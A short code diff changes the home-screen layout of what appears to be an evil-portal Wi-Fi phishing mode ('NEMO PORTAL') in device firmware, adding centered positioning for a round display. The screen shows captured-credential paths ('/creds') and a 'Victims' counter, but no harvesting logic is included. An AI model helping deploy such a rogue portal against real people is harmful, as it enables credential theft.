@@ -174,17 +174,33 @@ void printHomeToScreen() {
   DISP.setSwapBytes(true);
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(BGCOLOR, FGCOLOR);
-  DISP.setCursor(0, 0);
+    #ifdef DIAL
+      DISP.setCursor((240 - DISP.textWidth(" NEMO PORTAL "))/2, 70);
+    #else
+      DISP.setCursor(0, 0);
+    #endif
   DISP.println(" NEMO PORTAL ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
+    #ifdef DIAL
+      DISP.setCursor((240 - DISP.textWidth(apSsidName.c_str()))/2, 95);
+    #endif
   DISP.printf("%s\n\n",apSsidName.c_str());
+    #ifdef DIAL
+      DISP.setCursor(10, 110);
+    #endif
   DISP.print("WiFi IP: ");
   DISP.println(AP_GATEWAY);
+    #ifdef DIAL
+      DISP.setCursor((240 - DISP.textWidth("Paths: /creds /ssid"))/2, 125);
+    #endif
   DISP.println("Paths: /creds /ssid");
   DISP.setTextSize(MEDIUM_TEXT);
   DISP.setTextColor(BGCOLOR, FGCOLOR);
-  DISP.printf("Victims: %-4d\n", totalCapturedCredentials);
+    #ifdef DIAL
+      DISP.print(" ");
+    #endif
+  DISP.printf("Victims:%-4d\n", totalCapturedCredentials);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
